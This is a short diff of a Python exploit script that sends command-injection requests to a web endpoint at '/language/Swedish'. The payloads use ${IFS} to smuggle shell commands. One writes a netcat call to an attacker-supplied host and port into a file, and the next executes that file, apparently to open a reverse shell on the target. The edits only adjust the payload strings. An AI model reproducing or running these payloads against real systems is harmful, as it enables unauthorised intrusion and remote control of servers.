@@ -86,7 +86,7 @@ def main():
 
         # Three ..
         try:
-            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s${IFS}>e&&${IFS}/a'
+            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s>e&&${IFS}/a'
                         % (target_url.scheme, target_url.netloc, match.group('host'), match.group('port')))
 
         # Two ...
@@ -96,7 +96,7 @@ def main():
 
 
         # One. Left off!
-            raw_url_request('%s://%s/language/Swedish&&$(cat${IFS}e)${IFS}&>r&&${IFS}/s'
+            raw_url_request('%s://%s/language/Swedish${IFS}&&$(cat${IFS}e)&${IFS}/s'
                          % (target_url.scheme, target_url.netloc))
 
         except (ConnectionError, Timeout, timeout) as e:
